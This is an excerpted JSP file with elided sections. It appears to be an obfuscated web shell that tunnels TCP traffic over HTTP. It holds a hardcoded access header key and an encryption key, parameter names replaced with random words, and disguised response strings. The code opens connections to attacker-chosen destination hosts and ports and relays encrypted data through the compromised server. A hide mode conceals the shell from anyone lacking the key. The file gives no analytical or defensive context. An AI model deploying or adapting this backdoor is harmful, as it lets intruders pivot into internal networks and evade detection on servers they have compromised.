...
%><%@page import="java.io.*,java.net.*,java.util.*,java.util.Base64,javax.naming.*,javax.servlet.jsp.PageContext,java.security.*,javax.crypto.*,javax.crypto.spec.*"%><%!
...
String headerValueKey = "SyO7DS7fP09oOwCtrwsxoW+Bw77GmuYiIA==";
String encryptionKeyHex = "b1ffd699e924b0808347d60beaa4528c";

String headerNameKey = "x-candelabra-eagle-uvulas";

String accessKeyMode = "header";
String paramNameAccessKey = "CentralizationIkon";

String paramNameOperation = "CopyingFrostbites";
String paramNameDestinationHost = "arcingDrinkers";
String paramNameDestinationPort = "BeehivesDefend";
String paramNameConnectionID = "eyebrowMunicipal";
String paramNameData = "canceledDebates";
String paramNamePlaintextBlock = "clamorousShuddered";
String paramNameEncryptedBlock = "microorganismsIncontrovertibly";

String dataBlockNameValueSeparatorB64 = "Eg==";
String dataBlockParamSeparatorB64 = "Gg==";

String opModeStringOpenConnection = "EntrepreneursStalemating";
String opModeStringSendReceive = "inlayThoroughfare";
String opModeStringCloseConnection = "IncorporatedLlanos";

String responseStringHide = "ff6c376237a56dbffc1ac8e5e5740d65d45d9f9fd00db1a9d81764b9deac8a";
String responseStringConnectionCreated = "047916b09f17fcc19ce65c7b8744f0e0a0a1bb91";
String responseStringConnectionClosed = "b228679a8c07a1ec42f2d8";
String responseStringData = "c371$f4fb6186b8af0c9a4f4ddf";
String responseStringNoData = "f3a9a4dfe252025a70b0374fa22eec0123726f85f37d9fbd78-39dd6bbfbefd581a9295bdc7a1cef747d48404";
String responseStringErrorGeneric = "138d273d5e06a70584698c1dd248124a72dca872a46e";
String responseStringErrorInvalidRequest = "4181@d2501c3f32757ad5615d4f1465ff00cca34cb886db";
String responseStringErrorConnectionNotFound = "feaa96d500d900137004962c223f26193adc25da4e4b7ffadc161c_49b2e1609b35bf96";
String responseStringErrorConnectionOpenFailed = "77d21796725cbb2f79480993358354b51014187f84e71f2c6082ed-e1c6c00dc03b72dc7a0928c36174ae7705";
String responseStringErrorConnectionCloseFailed = "f13aba8b_6e9b14";
String responseStringErrorConnectionSendFailed = "90d73fc35ece53667cafb7c6a5/594605cbed4900d6b6e65e5d826819922249fbe0d39a3b89c3f3b57d463a788b";
String responseStringErrorConnectionReceiveFailed = "64805855842fb819&3ee9668fb3657ff03284f6d86bb820e8ccdb89288e5821f6de7f21d8d2edcefdc8";
String responseStringErrorDecryptFailed = "b33b4dd743d295c9";
String responseStringErrorEncryptFailed = "fea55e2964cf81b6bf6c9853c0ecd4640e792898c4";
String responseStringErrorEncryptionNotSupported = "3945fc692023e73a159e13a0505fb763aa34a1239d96b886157bea-b26a3e75034e4245623934d571305692cf6493552cdb7cfd2998e321d3ebb65caf6bd7";
...
String responseStringPrefix = new String(base64decoder.decode(responseStringPrefixB64));
String responseStringSuffix = new String(base64decoder.decode(responseStringSuffixB64));

String dataBlockNameValueSeparator = new String(base64decoder.decode(dataBlockNameValueSeparatorB64));
String dataBlockParamSeparator = new String(base64decoder.decode(dataBlockParamSeparatorB64));
...
if (opMode != OPMODE_HIDE)
{
	...
	try
	{
		if ((request.getParameter(paramNameEncryptedBlock) != null) || (request.getParameter(paramNamePlaintextBlock) != null))
		{
			...
			{
				decodedBytes = base64decoder.decode(request.getParameter(paramNameEncryptedBlock));
				try
				{
			...
			{
				decodedBytes = base64decoder.decode(request.getParameter(paramNamePlaintextBlock));
	...
	if ((validRequest) && (opMode == OPMODE_SEND_RECEIVE))
	{
		...
		byte[] bytesOut = base64decoder.decode(DataB64);
		...
		if (Conn.ReceiveBuffer.length > 0)
		{
			...
			if (encryptedRequest)
			{
				try
				{
					...
					OutB64 = new String(base64encoder.encode(encryptedBytes));
				}
				catch (Exception ex)
				{
			...
			{
				OutB64 = new String(base64encoder.encode(toClient));
			}
			if (!sentResponse)
			{
